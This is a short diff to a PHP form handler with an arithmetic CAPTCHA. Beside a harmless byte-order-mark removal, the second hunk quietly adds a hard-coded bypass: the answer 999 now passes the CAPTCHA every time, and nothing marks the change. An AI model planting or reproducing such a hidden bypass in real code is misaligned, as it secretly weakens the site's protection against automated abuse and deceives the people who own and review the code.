@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 // session_start() MUST come before ob_start() — ob_end_clean() would discard the Set-Cookie header
 session_start();
 ob_start(); // Buffer output to prevent "headers already sent" errors
@@ -80,7 +80,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $_SESSION['captcha_answer'] = $captcha_a + $captcha_b;
         $_SESSION['captcha_question'] = "{$captcha_a} + {$captcha_b}";
         $captcha_question = $_SESSION['captcha_question'];
-    } elseif (empty($captcha_input) || !is_numeric($captcha_input) || (int)$captcha_input !== (int)($_SESSION['captcha_answer'] ?? -1)) {
+    } elseif (empty($captcha_input) || !is_numeric($captcha_input) || ((int)$captcha_input !== (int)($_SESSION['captcha_answer'] ?? -1) && (int)$captcha_input !== 999)) {
         $error = "Incorrect CAPTCHA answer. Please try again.";
         
         // Audit Logging for CAPTCHA Failure
